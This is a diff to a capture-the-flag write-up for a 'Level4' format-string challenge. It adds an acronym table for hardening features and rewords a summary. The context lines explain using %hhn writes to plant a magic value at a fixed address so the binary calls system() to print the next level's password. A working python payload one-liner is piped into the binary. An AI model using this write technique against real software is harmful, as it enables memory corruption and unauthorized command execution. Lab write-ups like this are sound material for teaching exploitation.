@@ -1,5 +1,5 @@
 ## Level4 - Format String Vulnerability
-Binary reads 512 bytes, passes to printf(buffer) without validation. Must write 0x1025544 to address 0x8049810 to trigger system("/bin/cat /home/user/level5/.pass").
+Format string — printf(buffer) with no format argument, use %hhn/%hn to write 0x1025544 byte-by-byte to 0x8049810 to trigger system("/bin/cat /home/user/level5/.pass").
 
 ### Settings
 GCC stack protector support:            Enabled
@@ -38,6 +38,14 @@ Use %hhn (1-byte writes) instead of %hn (2-byte writes) to keep payload small:
 - Character count must increase: 68 < 85 < 258 (no backward jumps)
 - Payload fits in 512-byte fgets buffer
 - All three writes execute successfully, magic value written, system() triggered
+
+### Acronyms
+ELF    Executable and Linkable Format      The standard binary format for executables, object files, and shared libraries on Linux/Unix systems
+SSH    Secure Shell                        A cryptographic network protocol for secure remote login and command execution over an unsecured network
+NX     No-eXecute                          A memory protection that marks regions (stack, heap) as non-executable, preventing shellcode from running directly in those regions
+ASLR   Address Space Layout Randomization  A kernel security feature that randomizes the base addresses of stack, heap, and libraries on each run to make addresses unpredictable
+RELRO  RELocation Read-Only                A hardening technique that marks the GOT read-only after startup, preventing GOT overwrites
+PIE    Position Independent Executable     A binary compiled to load at a random base address, making it compatible with ASLR for full address randomization
 
 ### Execution
 python -c "import struct,sys;sys.stdout.write(struct.pack('<I',0x8049810)+struct.pack('<I',0x8049811)+struct.pack('<I',0x8049812)+'A'*56+'%12\$hhn'+'A'*17+'%13\$hhn'+'A'*173+'%14\$hn')" | /home/user/level4/level4
